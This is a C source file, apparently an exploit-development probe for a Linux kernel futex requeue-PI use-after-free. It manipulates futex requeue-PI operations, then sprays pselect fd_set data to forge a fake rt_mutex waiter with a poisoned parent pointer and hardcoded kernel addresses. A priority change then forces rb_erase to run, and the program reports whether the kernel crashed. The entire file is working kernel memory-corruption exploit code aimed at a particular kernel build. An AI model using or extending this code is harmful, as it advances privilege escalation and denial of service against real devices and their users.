/**
 * ghostlock_shape0_parent_crash.c — 真 shape0 + parent=0x4141… 探测 rb_erase
 *
 * 假设: EDEADLK 后 pselect 画 residual：
 *   lock = empty_zero_page（合法、unlocked → trylock 过）
 *   tree_parent = 0x4141414141414141（rb_erase 若执行会 fault）
 *   prio=130，consumer sched_setattr nice=19 → task prio 139（不早退）
 *
 * 常量 [BIN] #38 与 #245 同 VA：INIT_TASK / EMPTY_ZERO_PAGE / SHIFT=+15。
 * 崩 → rb_erase 可达。存活 → 仍在 tbnz w28 / owner 门之前退出。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
#define INIT_TASK_OFF 0x0379c180ULL
#define EMPTY_ZERO_PAGE_OFF 0x039ed000ULL
#define PSELECT_WAITER_WORD_SHIFT 15
#define FAKE_WAITER_PRIO 130
#ifndef PSELECT_ROUTE_NFDS
#define PSELECT_ROUTE_NFDS 640
#endif

#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)

static uint64_t data_addr(uint64_t image_addr) {
  uint64_t off = image_addr - KIMAGE_TEXT_BASE;
  uint64_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

static uint32_t f_wait __attribute__((aligned(64)));
static uint32_t f_pi_target __attribute__((aligned(64)));
static uint32_t f_pi_chain __attribute__((aligned(64)));

static atomic_int waiter_ready, waiter_waiting, owner_started;
static atomic_int wait_returned, reclaim_done, all_done, waiter_tid;

static long futex_op(uint32_t *uaddr, int op, uint32_t val, const void *timeout,
                     uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static long sched_setattr_tid(int tid, int nice_v) {
  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint32_t sched_period;
    uint32_t sched_util_min;
    uint32_t sched_util_max;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3; /* SCHED_BATCH */
  attr.sched_nice = nice_v;
  return syscall(274, tid, &attr, 0);
}

static void fdset_put_word(fd_set *s, int word, uint64_t val) {
  unsigned long *bits = (unsigned long *)s;
  int max_words = (int)(sizeof(fd_set) / sizeof(unsigned long));
  if (word < 0 || word >= max_words)
    return;
  bits[word] = (unsigned long)val;
}

static int pselect_words_per_set(void) {
  int bpw = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bpw - 1) / bpw;
}

static void pselect_put_waiter_word(fd_set *in, fd_set *out, fd_set *ex,
                                    int waiter_word, uint64_t val) {
  int wps = pselect_words_per_set();
  int global_word = waiter_word + PSELECT_WAITER_WORD_SHIFT;
  if (global_word < 0)
    return;
  int set_idx = global_word / wps;
  int word_idx = global_word % wps;
  if (set_idx == 0)
    fdset_put_word(in, word_idx, val);
  else if (set_idx == 1)
    fdset_put_word(out, word_idx, val);
  else if (set_idx == 2)
    fdset_put_word(ex, word_idx, val);
}

static void run_pselect_reclaim(void) {
  uint64_t lock_ptr = data_addr(EMPTY_ZERO_PAGE);
  uint64_t task_ptr = INIT_TASK;
  uint64_t parent = 0x4141414141414141ull;
  const char *pc = getenv("PSELECT_PARENT_CRASH");
  if (pc && pc[0] == '0')
    parent = 1; /* shape1 null-parent control — should NOT deref 0x4141 */
  uint64_t right = 0;
  uint64_t left = 0;

  printf("[W] shape0 parent-crash lock(zero)=%016llx task=%016llx parent=%016llx "
         "prio=%d\n",
         (unsigned long long)lock_ptr, (unsigned long long)task_ptr,
         (unsigned long long)parent, FAKE_WAITER_PRIO);

  int pipefd[2];
  if (pipe(pipefd) != 0) {
    printf("[W] pipe errno=%d\n", errno);
    return;
  }

  fd_set in, out, ex;
  FD_ZERO(&in);
  FD_ZERO(&out);
  FD_ZERO(&ex);
  pselect_put_waiter_word(&in, &out, &ex, 0, parent);
  pselect_put_waiter_word(&in, &out, &ex, 1, right);
  pselect_put_waiter_word(&in, &out, &ex, 2, left);
  pselect_put_waiter_word(&in, &out, &ex, 3, parent);
  pselect_put_waiter_word(&in, &out, &ex, 4, right);
  pselect_put_waiter_word(&in, &out, &ex, 5, left);
  pselect_put_waiter_word(&in, &out, &ex, 6, task_ptr);
  pselect_put_waiter_word(&in, &out, &ex, 7, lock_ptr);
  pselect_put_waiter_word(&in, &out, &ex, 8, (uint64_t)FAKE_WAITER_PRIO);
  pselect_put_waiter_word(&in, &out, &ex, 9, 0);

  int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    printf("[W] F_DUPFD errno=%d\n", errno);
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }
  for (int fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, &in) || FD_ISSET(fd, &out) || FD_ISSET(fd, &ex))
      dup2(high_read, fd);
  }
  FD_CLR(0, &in);
  FD_CLR(1, &in);
  FD_CLR(2, &in);
  FD_CLR(0, &out);
  FD_CLR(1, &out);
  FD_CLR(2, &out);
  FD_CLR(0, &ex);
  FD_CLR(1, &ex);
  FD_CLR(2, &ex);
  close(high_read);
  dup2(pipefd[0], PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, &ex);

  struct timespec ts = {.tv_sec = 0, .tv_nsec = 80 * 1000 * 1000};
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
  printf("[W] pselect ret=%d errno=%d\n", ret, errno);
  close(pipefd[0]);
  close(pipefd[1]);
}

static void *waiter_thread(void *arg) {
  (void)arg;
  atomic_store(&waiter_tid, (int)syscall(SYS_gettid));
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started))
    usleep(500);

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 3;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  atomic_store(&wait_returned, 1);
  printf("[W] WAIT ret=%ld errno=%d\n", r, errno);

  run_pselect_reclaim();
  atomic_store(&reclaim_done, 1);
  usleep(400000);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&all_done, 1);
  return NULL;
}

static void *owner_thread(void *arg) {
  (void)arg;
  futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&waiter_ready))
    usleep(500);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&all_done))
    usleep(10000);
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

static void *consumer_thread(void *arg) {
  (void)arg;
  while (!atomic_load(&reclaim_done) && !atomic_load(&all_done))
    usleep(500);
  int tid = atomic_load(&waiter_tid);
  errno = 0;
  long r = sched_setattr_tid(tid, 19);
  printf("[C] sched_setattr nice=19 tid=%d ret=%ld errno=%d\n", tid, r, errno);
  return NULL;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  printf("ghostlock_shape0_parent_crash — rb_erase reach on #38\n");
  printf("expect: panic if rb_erase derefs parent=0x4141...\n");

  pthread_t wt, ot, ct;
  pthread_create(&wt, NULL, waiter_thread, NULL);
  pthread_create(&ot, NULL, owner_thread, NULL);
  pthread_create(&ct, NULL, consumer_thread, NULL);

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(500);
  usleep(50000);

  errno = 0;
  long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)(uintptr_t)1,
                     &f_pi_target, f_wait);
  printf("[M] CMP_REQUEUE_PI ret=%ld errno=%d\n", rr, errno);

  pthread_join(wt, NULL);
  pthread_join(ct, NULL);
  pthread_join(ot, NULL);
  printf("KERNEL SURVIVED — rb_erase not reached (or parent not at residual)\n");
  return 0;
}
